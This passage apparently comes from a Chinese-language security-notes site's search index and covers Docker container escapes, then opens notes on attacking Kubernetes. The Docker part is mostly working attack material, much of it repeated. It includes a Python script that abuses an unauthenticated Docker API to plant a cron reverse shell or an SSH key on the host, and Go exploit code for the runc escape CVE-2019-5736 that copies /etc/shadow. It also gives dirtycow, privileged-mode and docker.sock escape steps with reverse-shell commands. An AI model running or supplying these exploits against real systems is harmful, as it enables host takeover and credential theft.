'/bin/bash -c \"echo \\\\\\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\\\\\" >> /tmp/spool/cron/crontabs/root\"' #chmod 600 else: payload = '/bin/bash -c \"echo \\\\\\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\\\\\" >> /tmp/spool/cron/root\"' #centos,redhat and so on print \"[-]Paylaod: \"+payload if sshkey !='' and key == 1: payload = '/bin/bash -c \"echo \\\\\\\"'+sshkey+'\\\\\\\" >> /tmp1/.ssh/authorized_keys\"' print \"[-]Paylaod: \"+payload if isset('host') and isset('port'): if isset('version') and version == 1: url = \"http://\"+host+\":\"+port+\"/version\" ret = json.loads(http_get(url)) print \"[-] ApiVersion: \"+ret['ApiVersion'] elif isset('imagesList'): url = \"http://\"+host+\":\"+port+\"/images/json\" ret = json.loads(http_get(url)) for info in ret: print \"RepoTags: \"+info['RepoTags'][0] elif isset('createContainer') and isset('imageName'): cli = createClient(host,port,version) container = cli.create_container(image=imageName, command='/bin/bash', tty=True, volumes=['/tmp','/tmp1'], host_config=cli.create_host_config(binds=['/var:/tmp:rw','/root:/tmp1:rw'])) print \"[-]Container ID:\"+container['Id'] print \"[-]Warning:\"+str(container['Warnings']) response = cli.start(container=container.get('Id')) if isset('isUbuntu'): cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd=payload)) print \"[-]create crontabs ......\" cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd='chmod 600 /tmp/spool/cron/crontabs/root')) print \"[-]chmod 600 ......\" else: print cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd=payload)) print \"[-]create crontabs ......\" elif isset('closeContainer') and isset('imageId'): cli = createClient(host,port,version) cli.stop(container=imageId) cli.remove_container(container=imageId) elif isset('startContainer') and isset('imageId'): cli = createClient(host,port,version) cli.start(container=imageId) elif isset('dataExec') and isset('imageId'): cli = createClient(host,port,version) print \"[-]Command:\"+dataExec print cli.exec_start(exec_id=cli.exec_create(container=imageId, cmd=dataExec)) elif isset('portList'): url = \"http://\"+host+\":\"+port+\"/containers/json\" ret = json.loads(http_get(url)) for pl in ret: if isset(\"pl['Names'][0]\"): name = pl['Names'][0] else: name = '*' for portsList in pl['Ports']: printport(portsList, name) else: if isset('allContainer'): printContainer(host,port,version,allContainer) else: printContainer(host,port,version,0) \u4f7f\u7528\u5e2e\u52a9\uff1a # docker_api_vul docker \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u5229\u7528\u811a\u672c ##\u67e5\u770b\u8fd0\u884c\u7684\u5bb9\u5668 python dockerRemoteApiGetRootShell.py -h x.x.x.x -p 2375 ##\u67e5\u770b\u6240\u6709\u7684\u5bb9\u5668 python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -a ##\u67e5\u770b\u6240\u6709\u955c\u50cf python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -l ##\u67e5\u770b\u7aef\u53e3\u6620\u5c04 python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -L ##\u5199\u8ba1\u5212\u4efb\u52a1\uff08centos,redhat\u7b49,\u52a0-u\u53c2\u6570\u7528\u4e8eubuntu\u7b49\uff09 python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -C -i \u955c\u50cf\u540d -H \u53cd\u5f39ip -P \u53cd\u5f39\u7aef\u53e3 python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -C -u -i \u955c\u50cf\u540d -H \u53cd\u5f39ip -P \u53cd\u5f39\u7aef\u53e3 ##\u5199sshkey(\u81ea\u884c\u4fee\u6539\u811a\u672c\u7684\u4e2d\u516c\u94a5) python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -C -i \u955c\u50cf\u540d -k ##\u5728\u5bb9\u5668\u4e2d\u6267\u884c\u547d\u4ee4 python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -e \"id\" -I \u5bb9\u5668id ##\u5220\u9664\u5bb9\u5668 python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -c -I \u5bb9\u5668id ##\u4fee\u6539client api\u7248\u672c python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -v 1.22 ##\u67e5\u770b\u670d\u52a1\u7aefapi\u7248\u672c python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -V CVE-2019-5736\u9003\u9038 runc\u9003\u9038\u9700\u8981\u4ea4\u4e92\uff0c\u9700\u8981\u7ba1\u7406\u5458exec\u4e00\u6b21 \u7f16\u8bd1 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go main.go package main // Implementation of CVE-2019-5736 // Created with help from @singe, @_cablethief, and @feexd. // This commit also helped a ton to understand the vuln // https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d import ( \"fmt\" \"io/ioutil\" \"os\" \"strconv\" \"strings\" ) // This is the line of shell commands that will execute on the host var payload = \"#!/bin/bash \\n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow\" func main() { // First we overwrite /bin/sh with the /proc/self/exe interpreter path fd, err := os.Create(\"/bin/sh\") if err != nil { fmt.Println(err) return } fmt.Fprintln(fd, \"#!/proc/self/exe\") err = fd.Close() if err != nil { fmt.Println(err) return } fmt.Println(\"[+] Overwritten /bin/sh successfully\") // Loop through all processes to find one whose cmdline includes runcinit // This will be the process created by runc var found int for found == 0 { pids, err := ioutil.ReadDir(\"/proc\") if err != nil { fmt.Println(err) return } for _, f := range pids { fbytes, _ := ioutil.ReadFile(\"/proc/\" + f.Name() + \"/cmdline\") fstring := string(fbytes) if strings.Contains(fstring, \"runc\") { fmt.Println(\"[+] Found the PID:\", f.Name()) found, err = strconv.Atoi(f.Name()) if err != nil { fmt.Println(err) return } } } } // We will use the pid to get a file handle for runc on the host. var handleFd = -1 for handleFd == -1 { // Note, you do not need to use the O_PATH flag for the exploit to work. handle, _ := os.OpenFile(\"/proc/\"+strconv.Itoa(found)+\"/exe\", os.O_RDONLY, 0777) if int(handle.Fd()) > 0 { handleFd = int(handle.Fd()) } } fmt.Println(\"[+] Successfully got the file handle\") // Now that we have the file handle, lets write to the runc binary and overwrite it // It will maintain it's executable flag for { writeHandle, _ := os.OpenFile(\"/proc/self/fd/\"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) > 0 { fmt.Println(\"[+] Successfully got write handle\", writeHandle) writeHandle.Write([]byte(payload)) return } } } dirtycow\u9003\u9038 git clone https://github.com/scumjr/dirtycow-vdso.git cd /dirtycow-vdso/ make ./0xdeadbeef #\u53cd\u5f39shell\u5230\u672c\u5730\u4e3b\u673a ./0xdeadbeef ip:port #\u53cd\u5f39shell\u5230\u6307\u5b9a\u4e3b\u673a\u7684\u6307\u5b9a\u7aef\u53e3 \u5de5\u5177\uff1adirtycow-vdso-master.zip docker\u7279\u6743\u6a21\u5f0f\u9003\u9038 \u5982\u5bb9\u5668\u8fd0\u884c\u65f6\u5f00\u542f\u4e86\u7279\u6743\u6a21\u5f0f\uff0c\u865a\u62df\u673a\u7684root\u62e5\u6709\u5bbf\u4e3b\u673a\u7684mount\u6743\u9650\uff0c\u53efmount\u5bbf\u4e3b\u673a\u7684\u6839\u76ee\u5f55\u7684\u78c1\u76d8\u5230\u865a\u62df\u673a\uff0c\u7136\u540e\u5199\u6587\u4ef6\u3002 sudo docker run -itd --privileged ubuntu:latest /bin/bash B\u3001\u5728\u5bb9\u5668\u5185\uff0c\u67e5\u770b\u78c1\u76d8\u6587\u4ef6 fdisk -l \u5c06/dev/sda1 \u6302\u8f7d\u5230\u65b0\u5efa\u76ee\u5f55 mkdir /test mount /dev/sda1 /test \u5c06\u8ba1\u5212\u4efb\u52a1\u5199\u5165\u5230\u5bbf\u4e3b\u673a echo '* * * * * /bin/bash -i >& /dev/tcp/192.168.172.136/12345 0>&1' >> /test/var/spool/cron/crontabs/root docker.sock\u9003\u9038 \u5982\u5c06docker.sock\u6302\u8f7d\u5230\u4e86\u5bb9\u5668\uff0c\u53ef\u81ea\u5b9a\u4e49\u6302\u8f7d\uff0c\u5c06\u5bbf\u4e3b\u673a\u6302\u8f7d\u5230\u5bb9\u5668 \u67e5\u627edocker.sock find / -name docker.sock docker run --rm -it \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v /usr/bin/docker:/usr/bin/docker \\ ubuntu \\ /bin/bash \u5728\u5bb9\u5668\u67e5\u770b\u5bbf\u4e3b\u673adocker\u4fe1\u606f\uff1a docker -H unix:///var/run/docker.sock info \u8fd0\u884c\u4e00\u4e2a\u65b0\u5bb9\u5668\u5e76\u6302\u8f7d\u5bbf\u4e3b\u673a\u6839\u8def\u5f84\uff1a docker -H unix:///var/run/docker.sock run -it -v /:/test ubuntu /bin/bash ls -al /test CVE-2020-15257 \u6587\u4ef6\u590d\u5236 \u4ece\u4e3b\u673a\u590d\u5236\u5230\u5bb9\u5668 sudo docker cp host_path containerID:container_path \u4ece\u5bb9\u5668\u590d\u5236\u5230\u4e3b\u673a sudo docker cp containerID:container_path host_path","title":"Docker"},{"location":"Web%E7%9B%B8%E5%85%B3/Docker/#api","text":"\u67e5\u770bimages 2375:/images/json /containers/json \u547d\u4ee4\u884c\u67e5\u770bimages docker -H tcp://10.1.1.1:2375 images \u547d\u4ee4\u884c\u521b\u5efa\u5bb9\u5668\u5e76\u8fdb\u5165\uff0c\u5c06\u5bbf\u4e3b\u673a\u6839\u76ee\u5f55\u6302\u8f7d\u5230\u5bb9\u5668/tmp\u4e0b docker -H tcp://10.1.1.1:2375 run -it -v /:/mnt 170de16e73ea /bin/bash \u5199\u8ba1\u5212\u4efb\u52a1\u53cd\u5f39\u5bbf\u4e3b\u673a echo '* * * * * bash -i >& /dev/tcp/x.x.x.x/8888 0>&1' >> /test/var/spool/cron/root \u5229\u7528\u811a\u672c\uff1a #-*- coding:utf-8 -*- #author:L.N.@insight-labs.org #docker-py == 1.8.1 import urllib2 import urllib import json import sys import getopt from docker import Client def http_get(url): response = urllib2.urlopen(url) return response.read() def http_post(url, values): jdata = values #print url #print jdata send_headers = { 'Content-Type':'application/json' } req = urllib2.Request(url, data=jdata,headers=send_headers) response = urllib2.urlopen(req) return response.read() def isset(v): try : type(eval(v)) except: return 0 else: return 1 def printport(portsList, name): if isset(\"portsList['IP']\") == 0: portsList['IP']=\"*\" printport(portsList,name) elif isset(\"portsList['Type']\") == 0: portsList['Type']=\"*\" printport(portsList,name) elif isset(\"portsList['PublicPort']\") == 0: portsList['PublicPort']=\"*\" printport(portsList,name) elif isset(\"portsList['PrivatePort']\") == 0: portsList['PrivatePort']=\"*\" printport(portsList,name) else: print \"[-]\"+name+\"[+]\"+portsList['Type']+\"[-]\"+portsList['IP']+\":\"+str(portsList['PrivatePort'])+\" --> \"+host+\":\"+str(portsList['PublicPort']) def createClient(host,port,version): clientApiVersion = getversion(host,port,version) print \"[-]ClientApiVersion:\"+clientApiVersion cli = Client(base_url='tcp://'+host+':'+port,version=clientApiVersion) return cli def getversion(host,port,version): url = \"http://\"+host+\":\"+port+\"/version\" ret = json.loads(http_get(url)) if version != '': clientApiVersion = version else: clientApiVersion = ret['ApiVersion'] return clientApiVersion def printContainer(host,port,version,allContainer): cli = createClient(host,port,version) if allContainer == 1: ret = cli.containers(all=True) else: ret = cli.containers() for info in ret: print \"[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\" print \"[-] id: \"+info['Id'] print \"[-] Names: \"+info['Names'][0] print \"[-] Image: \"+info['Image'] print \"[-] Status: \"+info['Status'] print \"[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\" if __name__ == \"__main__\": opts, args = getopt.getopt(sys.argv[1:], \"v:kauVCcsLli:e:h:p:H:P:I:\") key = 0 version ='' payload ='' sshkey = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoecC7vmWn4s2y4T+Pc3bJ0owDYWzGIBTCWWonN4qMTCbe66hKopgtUuHC1y5H3HFQ0qsni0vFAGSoO4TLiIpvHUXbf9Wi9vR2q4oYphH9Kgsd3cVXsHUFcgybwdk5DCXpmoSJTlEoOrtWajYdyuALMy+CqpkwWDj+uTz+9/2P3T0Nh5F+U+UZOgSqIi5xQfUGJKGoFGXwvpqEL6UnGG4bbgGxVa5mJZVH0cxwKK6w7luezkcRVBEJ1SZAkjZOmZojyJbYQolItcBNBsXQ+cakjg3DeU69wrDiBdP+k2i2k3uzhJqJXfxLdxUZfjgXHwSOzDb2D5+841trASAwZAy1Gq4uwkbmwupe/qTPK2R31d5h4Jqx4N19eUjT8GkkDj+mnJTwYyOPJH/ghEvn4UfNOtohM2lZPbskvvskn82g0WzYJ5JnQaKfup1IYLTraBbJ5UdVYsCfG5ddRZF4xMab2ZDgcdqyISJxHPK9/P7w7mmgSut1nK5R1+HLSl/xDAPcoVd0H3ePqxN9ZD0BoMjY8fPxKAQR+bB5M05iDIIwUxhj2NQvCpwxxGwJXUSf13zirXRZhkZGnWrkNrzqHzpLZqoEBCEORErmFAvsI8yIBvThSylReiwhAWkdL7ONQ4dd7UgsQfY/0MMfxd8/V+041I1sIVUVBnHYUUwqE0eZ9Q== wanniba@wanniba.com' for op, value in opts: if op ==\"-l\": imagesList = 1 elif op == \"-i\": imageName = value elif op == \"-e\": dataExec = value elif op == \"-h\": host = value elif op =='-p': port = value elif op == '-L': portList = 1 elif op == '-H': lhsot = value elif op == '-P': lport = value elif op =='-C': createContainer = 1 elif op == '-v': version = value elif op == '-V': version = 1 elif op == '-c': closeContainer = 1 elif op == '-I': imageId = value elif op == '-a': allContainer = 1 elif op == '-s': startContainer = 1 elif op == '-k': key = 1 elif op == '-u': isUbuntu = 1 if isset('lhsot') and isset('lport'): if isset('isUbuntu'): payload = '/bin/bash -c \"echo \\\\\\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\\\\\" >> /tmp/spool/cron/crontabs/root\"' #chmod 600 else: payload = '/bin/bash -c \"echo \\\\\\\"*/1 * * * * /bin/bash -i >& /dev/tcp/'+lhsot+'/'+lport+' 0>&1\\\\\\\" >> /tmp/spool/cron/root\"' #centos,redhat and so on print \"[-]Paylaod: \"+payload if sshkey !='' and key == 1: payload = '/bin/bash -c \"echo \\\\\\\"'+sshkey+'\\\\\\\" >> /tmp1/.ssh/authorized_keys\"' print \"[-]Paylaod: \"+payload if isset('host') and isset('port'): if isset('version') and version == 1: url = \"http://\"+host+\":\"+port+\"/version\" ret = json.loads(http_get(url)) print \"[-] ApiVersion: \"+ret['ApiVersion'] elif isset('imagesList'): url = \"http://\"+host+\":\"+port+\"/images/json\" ret = json.loads(http_get(url)) for info in ret: print \"RepoTags: \"+info['RepoTags'][0] elif isset('createContainer') and isset('imageName'): cli = createClient(host,port,version) container = cli.create_container(image=imageName, command='/bin/bash', tty=True, volumes=['/tmp','/tmp1'], host_config=cli.create_host_config(binds=['/var:/tmp:rw','/root:/tmp1:rw'])) print \"[-]Container ID:\"+container['Id'] print \"[-]Warning:\"+str(container['Warnings']) response = cli.start(container=container.get('Id')) if isset('isUbuntu'): cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd=payload)) print \"[-]create crontabs ......\" cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd='chmod 600 /tmp/spool/cron/crontabs/root')) print \"[-]chmod 600 ......\" else: print cli.exec_start(exec_id=cli.exec_create(container=container.get('Id'), cmd=payload)) print \"[-]create crontabs ......\" elif isset('closeContainer') and isset('imageId'): cli = createClient(host,port,version) cli.stop(container=imageId) cli.remove_container(container=imageId) elif isset('startContainer') and isset('imageId'): cli = createClient(host,port,version) cli.start(container=imageId) elif isset('dataExec') and isset('imageId'): cli = createClient(host,port,version) print \"[-]Command:\"+dataExec print cli.exec_start(exec_id=cli.exec_create(container=imageId, cmd=dataExec)) elif isset('portList'): url = \"http://\"+host+\":\"+port+\"/containers/json\" ret = json.loads(http_get(url)) for pl in ret: if isset(\"pl['Names'][0]\"): name = pl['Names'][0] else: name = '*' for portsList in pl['Ports']: printport(portsList, name) else: if isset('allContainer'): printContainer(host,port,version,allContainer) else: printContainer(host,port,version,0) \u4f7f\u7528\u5e2e\u52a9\uff1a # docker_api_vul docker \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u5229\u7528\u811a\u672c ##\u67e5\u770b\u8fd0\u884c\u7684\u5bb9\u5668 python dockerRemoteApiGetRootShell.py -h x.x.x.x -p 2375 ##\u67e5\u770b\u6240\u6709\u7684\u5bb9\u5668 python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -a ##\u67e5\u770b\u6240\u6709\u955c\u50cf python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -l ##\u67e5\u770b\u7aef\u53e3\u6620\u5c04 python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -L ##\u5199\u8ba1\u5212\u4efb\u52a1\uff08centos,redhat\u7b49,\u52a0-u\u53c2\u6570\u7528\u4e8eubuntu\u7b49\uff09 python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -C -i \u955c\u50cf\u540d -H \u53cd\u5f39ip -P \u53cd\u5f39\u7aef\u53e3 python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -C -u -i \u955c\u50cf\u540d -H \u53cd\u5f39ip -P \u53cd\u5f39\u7aef\u53e3 ##\u5199sshkey(\u81ea\u884c\u4fee\u6539\u811a\u672c\u7684\u4e2d\u516c\u94a5) python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -C -i \u955c\u50cf\u540d -k ##\u5728\u5bb9\u5668\u4e2d\u6267\u884c\u547d\u4ee4 python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -e \"id\" -I \u5bb9\u5668id ##\u5220\u9664\u5bb9\u5668 python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -c -I \u5bb9\u5668id ##\u4fee\u6539client api\u7248\u672c python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -v 1.22 ##\u67e5\u770b\u670d\u52a1\u7aefapi\u7248\u672c python dockerRemoteApiGetRootShell.py -h 10.1.1.1 -p 2375 -V","title":"API\u672a\u6388\u6743\u8bbf\u95ee"},{"location":"Web%E7%9B%B8%E5%85%B3/Docker/#cve-2019-5736","text":"runc\u9003\u9038\u9700\u8981\u4ea4\u4e92\uff0c\u9700\u8981\u7ba1\u7406\u5458exec\u4e00\u6b21 \u7f16\u8bd1 CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go main.go package main // Implementation of CVE-2019-5736 // Created with help from @singe, @_cablethief, and @feexd. // This commit also helped a ton to understand the vuln // https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d import ( \"fmt\" \"io/ioutil\" \"os\" \"strconv\" \"strings\" ) // This is the line of shell commands that will execute on the host var payload = \"#!/bin/bash \\n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow\" func main() { // First we overwrite /bin/sh with the /proc/self/exe interpreter path fd, err := os.Create(\"/bin/sh\") if err != nil { fmt.Println(err) return } fmt.Fprintln(fd, \"#!/proc/self/exe\") err = fd.Close() if err != nil { fmt.Println(err) return } fmt.Println(\"[+] Overwritten /bin/sh successfully\") // Loop through all processes to find one whose cmdline includes runcinit // This will be the process created by runc var found int for found == 0 { pids, err := ioutil.ReadDir(\"/proc\") if err != nil { fmt.Println(err) return } for _, f := range pids { fbytes, _ := ioutil.ReadFile(\"/proc/\" + f.Name() + \"/cmdline\") fstring := string(fbytes) if strings.Contains(fstring, \"runc\") { fmt.Println(\"[+] Found the PID:\", f.Name()) found, err = strconv.Atoi(f.Name()) if err != nil { fmt.Println(err) return } } } } // We will use the pid to get a file handle for runc on the host. var handleFd = -1 for handleFd == -1 { // Note, you do not need to use the O_PATH flag for the exploit to work. handle, _ := os.OpenFile(\"/proc/\"+strconv.Itoa(found)+\"/exe\", os.O_RDONLY, 0777) if int(handle.Fd()) > 0 { handleFd = int(handle.Fd()) } } fmt.Println(\"[+] Successfully got the file handle\") // Now that we have the file handle, lets write to the runc binary and overwrite it // It will maintain it's executable flag for { writeHandle, _ := os.OpenFile(\"/proc/self/fd/\"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) > 0 { fmt.Println(\"[+] Successfully got write handle\", writeHandle) writeHandle.Write([]byte(payload)) return } } }","title":"CVE-2019-5736\u9003\u9038"},{"location":"Web%E7%9B%B8%E5%85%B3/Docker/#dirtycow","text":"git clone https://github.com/scumjr/dirtycow-vdso.git cd /dirtycow-vdso/ make ./0xdeadbeef #\u53cd\u5f39shell\u5230\u672c\u5730\u4e3b\u673a ./0xdeadbeef ip:port #\u53cd\u5f39shell\u5230\u6307\u5b9a\u4e3b\u673a\u7684\u6307\u5b9a\u7aef\u53e3 \u5de5\u5177\uff1adirtycow-vdso-master.zip","title":"dirtycow\u9003\u9038"},{"location":"Web%E7%9B%B8%E5%85%B3/Docker/#docker","text":"\u5982\u5bb9\u5668\u8fd0\u884c\u65f6\u5f00\u542f\u4e86\u7279\u6743\u6a21\u5f0f\uff0c\u865a\u62df\u673a\u7684root\u62e5\u6709\u5bbf\u4e3b\u673a\u7684mount\u6743\u9650\uff0c\u53efmount\u5bbf\u4e3b\u673a\u7684\u6839\u76ee\u5f55\u7684\u78c1\u76d8\u5230\u865a\u62df\u673a\uff0c\u7136\u540e\u5199\u6587\u4ef6\u3002 sudo docker run -itd --privileged ubuntu:latest /bin/bash B\u3001\u5728\u5bb9\u5668\u5185\uff0c\u67e5\u770b\u78c1\u76d8\u6587\u4ef6 fdisk -l \u5c06/dev/sda1 \u6302\u8f7d\u5230\u65b0\u5efa\u76ee\u5f55 mkdir /test mount /dev/sda1 /test \u5c06\u8ba1\u5212\u4efb\u52a1\u5199\u5165\u5230\u5bbf\u4e3b\u673a echo '* * * * * /bin/bash -i >& /dev/tcp/192.168.172.136/12345 0>&1' >> /test/var/spool/cron/crontabs/root","title":"docker\u7279\u6743\u6a21\u5f0f\u9003\u9038"},{"location":"Web%E7%9B%B8%E5%85%B3/Docker/#dockersock","text":"\u5982\u5c06docker.sock\u6302\u8f7d\u5230\u4e86\u5bb9\u5668\uff0c\u53ef\u81ea\u5b9a\u4e49\u6302\u8f7d\uff0c\u5c06\u5bbf\u4e3b\u673a\u6302\u8f7d\u5230\u5bb9\u5668 \u67e5\u627edocker.sock find / -name docker.sock docker run --rm -it \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v /usr/bin/docker:/usr/bin/docker \\ ubuntu \\ /bin/bash \u5728\u5bb9\u5668\u67e5\u770b\u5bbf\u4e3b\u673adocker\u4fe1\u606f\uff1a docker -H unix:///var/run/docker.sock info \u8fd0\u884c\u4e00\u4e2a\u65b0\u5bb9\u5668\u5e76\u6302\u8f7d\u5bbf\u4e3b\u673a\u6839\u8def\u5f84\uff1a docker -H unix:///var/run/docker.sock run -it -v /:/test ubuntu /bin/bash ls -al /test","title":"docker.sock\u9003\u9038"},{"location":"Web%E7%9B%B8%E5%85%B3/Docker/#cve-2020-15257","text":"","title":"CVE-2020-15257"},{"location":"Web%E7%9B%B8%E5%85%B3/Docker/#_1","text":"\u4ece\u4e3b\u673a\u590d\u5236\u5230\u5bb9\u5668 sudo docker cp host_path containerID:container_path \u4ece\u5bb9\u5668\u590d\u5236\u5230\u4e3b\u673a sudo docker cp containerID:container_path host_path","title":"\u6587\u4ef6\u590d\u5236"},{"location":"Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/","text":"k8s&\u4e91\u539f\u751f\u7b14\u8bb0 title: k8s&\u4e91\u5b89\u5168\u7b14\u8bb0 date: 2021-10-28 10:05:26 update: 2022\u5e744\u670822\u65e5 \u5b89\u88c5&&\u542f\u52a8 \u5b98\u65b9\u63d0\u4f9b\u4e86\u6a21\u62df\u73af\u5883\uff0c\u4f46\u662f\u6a21\u62df\u73af\u5883\u5e76\u4e0d\u662f\u5f88\u65b9\u4fbf\u3002 \u5b89\u88c5minikube minikube\u7528\u4e8e\u542f\u52a8cluster \u5148\u5b89\u88c5docker\uff0c18.09\u7248\u672c\u4ee5\u4e0a apt install docker.io \u5b89\u88c5minikube curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 sudo install minikube-linux-amd64 /usr/local/bin/minikube \u542f\u52a8minikube\uff0c\u542f\u52a8\u96c6\u7fa4 \u7b2c\u4e00\u6b21\u542f\u52a8k8s\u9700\u8981\u5b89\u88c5\uff0c\u6307\u5b9a\u963f\u91cc\u4e91\u955c\u50cf minikube start --force \\ --driver docker \\ --registry-mirror https://\\*\\*\\*\\*\\*\\*\\*\\*.mirror.aliyuncs.com \\ --image-repository=registry.cn-hangzhou.aliyuncs.com/google_containers \u5982\u5b89\u88c5\u5361\u4f4f\uff0c\u5148\u4f7f\u7528 minikube delete \u5220\u9664\u65e7\u6570\u636e \u5982\u63d0\u793adocker\u8fd0\u884c\u6743\u9650\u4e0d\u591f\uff0c\u53ef\u4f7f\u7528\u5f3a\u5236\u542f\u52a8 minikube start --force --driver=docker \u542f\u52a8nimikube\u540e\uff0c\u4fbf\u4f1a\u81ea\u52a8\u4e3a\u7cfb\u7edf\u521b\u5efa\u4e00\u4e2acluster \u66f4\u591a\u5b89\u88c5\u8be6\u60c5\u89c1https://minikube.sigs.k8s.io/docs/start/ \u5b89\u88c5kubectl kubectl\u7528\u4e8e\u547d\u4ee4\u884c\u7ba1\u7406\u96c6\u7fa4 \u5b89\u88c5\u8be6\u60c5\u89c1https://kubernetes.io/zh/docs/tasks/tools/install-kubectl-linux/ \u90e8\u7f72\u5e94\u7528 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u90e8\u7f72\u955c\u50cf\u662f\u4ecenodes\u91cc\u9762\u62c9\u7684\uff0c\u9700\u8981\u5c06nodes\u673a\u5668\u7684hosts\u89e3\u6790\u6539\u4e00\u4e0b\uff0c\u4e0d\u7136\u65e0\u6cd5\u62c9\u955c\u50cf kubectl create deployment podname --image=xx/xx kubectl\u7ba1\u7406 \u96c6\u7fa4\u7ba1\u7406 \u67e5\u770b\u96c6\u7fa4\u4fe1\u606f kubectl cluster-info kubectl get nodes kubectl version \u53ef\u4ee5\u4f7f\u7528kubectl proxy\u547d\u4ee4\u5c06API\u4ee3\u7406\u5230\u672c\u5730 \u9ed8\u8ba4\u672c\u5730\u8bbf\u95ee kubectl proxy \u5f00\u542f\u5176\u4ed6\u673a\u5668\u8bbf\u95ee\uff08\u9700\u8981\u6388\u6743\uff09 kubectl proxy --address=0.0.0.0 --port=8009 \u5f00\u542f\u5176\u4ed6\u673a\u5668\u8bbf\u95ee\uff08\u672a\u6388\u6743\u8bbf\u95ee\uff09 kubectl proxy --address='0.0.0.0' --accept-hosts='^*$' --port=8009 PODS\u7ba1\u7406 // \u83b7\u5f97\u6240\u6709\u8282\u70b9 > kubectl -s http://1.2.3.4:8080/ get nodes // \u83b7\u5f97\u6240\u6709\u5bb9\u5668 > kubectl -s http://1.2.3.4:8080/ get pods --all-namespaces=true // \u5728 myapp \u5bb9\u5668\u83b7\u5f97\u4e00\u4e2a\u4ea4\u4e92\u5f0f shell > kubectl -s http://1.2.3.4:8080/ --namespace=default exec -it myapp bash \u67e5\u770bpods kubectl get pods kubectl get pods -n kube-system \u5728pods\u4e0a\u6267\u884c\u547d\u4ee4 \u8fd9\u662f\u76f4\u63a5\u6267\u884c kubectl exec -ti podname whoami kubectl exec -ti podname whoami -n kube-system \u8fd9\u662f\u8fdb\u5165bash kubectl exec podname bash services\u7ba1\u7406 \u521b\u5efaservice\uff08nodeport\u5f62\u5f0f\uff09 kubectl create service nodeport nginx --tcp 80 \u521b\u5efaservice\uff08LoadBalancer\u5f62\u5f0f\uff09 kubectl expose deployment hello-node --type=LoadBalancer --port=8080 nodeport\u548cLoadBalancer\u533a\u522b\u662f\u8d1f\u8f7d \u67e5\u770bservice kubectl get service \u67e5\u770bservice\u8be6\u60c5 kubectl describe services/nginx \u8fd9\u6837\u5c31\u662f\u5c06service\u6620\u5c04\u5230\u4e86master\u4e0a\u3002 \u56fe\u5f62\u5316\u754c\u9762 http://127.0.0.1:46739/api/v1/namespaces/kubernetes-dashboard/services/http:kubernetes-dashboard:/proxy/#/workloads?namespace=default \u67e5\u770b\u914d\u7f6e kubectl config view \u67e5\u770b\u6240\u6709\u5bb9\u5668ip docker inspect -f='{{.Name}} {{.NetworkSettings.IPAddress}} {{.HostConfig.PortBindings}}' $(docker ps -aq) \u5229\u7528\u70b9 \u4e00\u4e9bAPI\u64cd\u4f5c \u53ef\u4ee5\u76f4\u63a5\u7528kubectl\u64cd\u4f5c \u67e5\u770bpods /api/v1/namespaces/default/pods?limit=500 \u521b\u5efa\u5bb9\u5668\uff0c\u8ddf\u4e00\u822c\u7684\u4e00\u6837 /api/v1/namespaces/default/pods 